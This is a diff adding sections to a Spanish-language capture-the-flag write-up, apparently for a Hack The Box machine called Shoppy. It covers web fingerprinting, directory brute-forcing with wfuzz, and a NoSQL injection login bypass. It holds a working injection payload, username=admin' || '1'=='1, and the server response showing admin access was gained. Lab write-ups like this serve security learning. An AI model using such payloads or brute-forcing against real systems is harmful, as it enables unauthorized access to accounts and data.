@@ -163,7 +163,63 @@ SF:o_gc_dur");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+### WhatWeb
 
+Comenzaremos reconociendo que tecnología está usando la web:
+
+```bash wrap=false
+❯ whatweb http://10.10.11.180                                                                                                                    
+http://10.10.11.180 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.23.1], IP[10.10.11.180], RedirectLocation[http://shoppy.htb], Title[301 Moved Permanently], nginx[1.23.1]
+http://shoppy.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.23.1], IP[10.10.11.180], JQuery, Script, Title[Shoppy Wait Page][Title element contains newline(s)!], nginx[1.23.1]
+```
+
+Deberemos añadir el dominio `shoppy.htb` a `/etc/hosts`.
+
+### Wfuzz
+
+Para ver archivos/directorios ocultos dentro de la web objetivo, usaremos `wfuzz` para realizar fuerza bruta:
+
+```bash wrap=false
+❯ wfuzz -c -L -t 200 --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt http://shoppy.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://shoppy.htb/FUZZ
+Total requests: 26583
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                               
+=====================================================================
+
+000000039:   200        25 L     62 W       1074 Ch     "login"                                                                                                                                                                               
+000000003:   200        25 L     62 W       1074 Ch     "admin"  
+```
+
+Si entramos a `/admin` nos lleva a `/login`.
+
+![Login panel](./1.png)
+
+### NoSQLi Auth Bypass
+
+Probando **payloads** para un `NoSQLi`, el de [este artículo](https://nullsweep.com/nosql-injection-cheatsheet/), me funciona `username=admin' || '1'=='1&password=admin`:
+
+```txt wrap=false
+HTTP/1.1 302 Found
+Server: nginx/1.23.1
+Date: Mon, 20 Oct 2025 16:23:36 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 56
+Connection: keep-alive
+Location: /admin
+Vary: Accept
+Set-Cookie: connect.sid=s%3AV4NRfeadzMU2OKTgpJu5jW2oK8xqKdv5.SOLmiusky7RmyjLwsezUBMeZpldJ1TPZIaIPpNJ1n4A; Path=/; HttpOnly
+
+<p>Found. Redirecting to <a href="/admin">/admin</a></p>
+```
+
+![Login bypass](./2.png)
 
 // PWNED
 
